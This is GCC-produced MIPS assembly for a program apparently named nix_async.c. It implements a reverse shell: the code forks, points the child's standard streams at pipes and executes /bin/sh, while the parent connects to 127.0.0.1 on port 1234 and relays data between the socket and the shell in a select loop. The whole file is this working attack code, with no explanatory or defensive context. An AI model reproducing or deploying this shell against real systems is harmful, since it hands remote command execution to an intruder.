	.file	1 "nix_async.c"
	.section .mdebug.abi32
	.previous
	.nan	legacy
	.module	fp=xx
	.module	nooddspreg
	.abicalls
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align	2
$LC0:
	.ascii	"/bin/sh\000"
	.section	.text.startup,"ax",@progbits
	.align	2
	.globl	main
	.set	nomips16
	.set	nomicromips
	.ent	main
	.type	main, @function
main:
	.frame	$sp,8432,$31		# vars= 8360, regs= 9/0, args= 24, gp= 8
	.mask	0x80ff0000,-4
	.fmask	0x00000000,0
	.set	noreorder
	.cpload	$25
	.set	nomacro
	addiu	$sp,$sp,-8432
	lw	$25,%call16(pipe)($28)
	addiu	$4,$sp,8384
	sw	$31,8428($sp)
	.cprestore	24
	sw	$23,8424($sp)
	sw	$22,8420($sp)
	sw	$21,8416($sp)
	sw	$20,8412($sp)
	sw	$19,8408($sp)
	sw	$18,8404($sp)
	sw	$17,8400($sp)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	sw	$16,8396($sp)

	lw	$28,24($sp)
	lw	$25,%call16(pipe)($28)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	addiu	$4,$sp,8376

	lw	$28,24($sp)
	lw	$25,%call16(fork)($28)
	.reloc	1f,R_MIPS_JALR,fork
1:	jalr	$25
	nop

	lw	$28,24($sp)
	bne	$2,$0,$L2
	lw	$4,8384($sp)

	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$5,$0

	li	$5,1			# 0x1
	lw	$28,24($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	lw	$4,8380($sp)

	li	$5,2			# 0x2
	lw	$28,24($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	lw	$4,8380($sp)

	lw	$28,24($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8384($sp)

	lw	$28,24($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8388($sp)

	lw	$28,24($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8376($sp)

	lw	$28,24($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8380($sp)

	move	$6,$0
	lw	$28,24($sp)
	addiu	$5,$sp,8368
	sw	$0,8372($sp)
	lw	$4,%got($LC0)($28)
	lw	$25,%call16(execve)($28)
	addiu	$4,$4,%lo($LC0)
	.reloc	1f,R_MIPS_JALR,execve
1:	jalr	$25
	sw	$4,8368($sp)

	lw	$28,24($sp)
$L16:
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8388($sp)

	lw	$28,24($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8376($sp)

	move	$2,$0
	lw	$31,8428($sp)
	lw	$23,8424($sp)
	lw	$22,8420($sp)
	lw	$21,8416($sp)
	lw	$20,8412($sp)
	lw	$19,8408($sp)
	lw	$18,8404($sp)
	lw	$17,8400($sp)
	lw	$16,8396($sp)
	jr	$31
	addiu	$sp,$sp,8432

$L2:
	lw	$25,%call16(close)($28)
	move	$21,$2
	li	$19,32			# 0x20
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	addiu	$18,$sp,32

	addiu	$22,$sp,8224
	lw	$28,24($sp)
	li	$20,32			# 0x20
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8380($sp)

	move	$6,$0
	lw	$28,24($sp)
	li	$5,2			# 0x2
	lw	$25,%call16(socket)($28)
	.reloc	1f,R_MIPS_JALR,socket
1:	jalr	$25
	li	$4,2			# 0x2

	li	$6,16			# 0x10
	move	$17,$2
	lw	$28,24($sp)
	li	$2,2			# 0x2
	addiu	$5,$sp,8352
	sh	$2,8352($sp)
	li	$2,1234			# 0x4d2
	lw	$25,%call16(connect)($28)
	move	$4,$17
	sh	$2,8354($sp)
	li	$2,16777216			# 0x1000000
	slt	$16,$17,0
	addiu	$2,$2,127
	.reloc	1f,R_MIPS_JALR,connect
1:	jalr	$25
	sw	$2,8356($sp)

	teq	$19,$0,7
	div	$0,$17,$19
	addiu	$2,$17,31
	lw	$28,24($sp)
	movz	$2,$17,$16
	sra	$16,$2,5
	li	$2,1			# 0x1
	sll	$16,$16,2
	addu	$16,$18,$16
	mfhi	$19
	sll	$19,$2,$19
$L8:
	li	$23,128			# 0x80
	move	$2,$0
$L4:
	addu	$3,$22,$2
	addiu	$2,$2,4
	bne	$2,$23,$L4
	sw	$0,0($3)

	lw	$3,8376($sp)
	move	$7,$0
	lw	$2,8192($16)
	move	$6,$0
	lw	$25,%call16(select)($28)
	move	$5,$22
	teq	$20,$0,7
	div	$0,$3,$20
	or	$2,$2,$19
	addiu	$4,$3,31
	sw	$2,8192($16)
	slt	$2,$3,0
	movz	$4,$3,$2
	li	$3,1			# 0x1
	sra	$2,$4,5
	sll	$2,$2,2
	addu	$2,$18,$2
	mfhi	$4
	sll	$3,$3,$4
	lw	$4,8192($2)
	or	$3,$3,$4
	li	$4,1024			# 0x400
	sw	$3,8192($2)
	.reloc	1f,R_MIPS_JALR,select
1:	jalr	$25
	sw	$0,16($sp)

	bltz	$2,$L5
	lw	$28,24($sp)

	lw	$2,8192($16)
	and	$2,$19,$2
	beq	$2,$0,$L17
	lw	$4,8376($sp)

	lw	$25,%call16(read)($28)
	li	$6,8192			# 0x2000
	move	$5,$18
	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	move	$4,$17

	blez	$2,$L5
	lw	$28,24($sp)

	lw	$25,%call16(write)($28)
	move	$6,$2
	lw	$4,8388($sp)
	.reloc	1f,R_MIPS_JALR,write
1:	jalr	$25
	move	$5,$18

	lw	$28,24($sp)
	lw	$4,8376($sp)
$L17:
	teq	$20,$0,7
	div	$0,$4,$20
	addiu	$3,$4,31
	slt	$2,$4,0
	movz	$3,$4,$2
	sra	$2,$3,5
	li	$3,1			# 0x1
	sll	$2,$2,2
	addu	$2,$18,$2
	lw	$2,8192($2)
	mfhi	$5
	sll	$3,$3,$5
	and	$2,$3,$2
	beq	$2,$0,$L4
	move	$2,$0

	lw	$25,%call16(read)($28)
	li	$6,8192			# 0x2000
	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	move	$5,$18

	blez	$2,$L5
	lw	$28,24($sp)

	lw	$25,%call16(write)($28)
	move	$6,$2
	move	$5,$18
	.reloc	1f,R_MIPS_JALR,write
1:	jalr	$25
	move	$4,$17

	b	$L8
	lw	$28,24($sp)

$L5:
	lw	$25,%call16(kill)($28)
	li	$5,18			# 0x12
	.reloc	1f,R_MIPS_JALR,kill
1:	jalr	$25
	move	$4,$21

	lw	$28,24($sp)
	lw	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$4,$17

	b	$L16
	lw	$28,24($sp)

	.set	macro
	.set	reorder
	.end	main
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-18) 6.3.0 20170516"
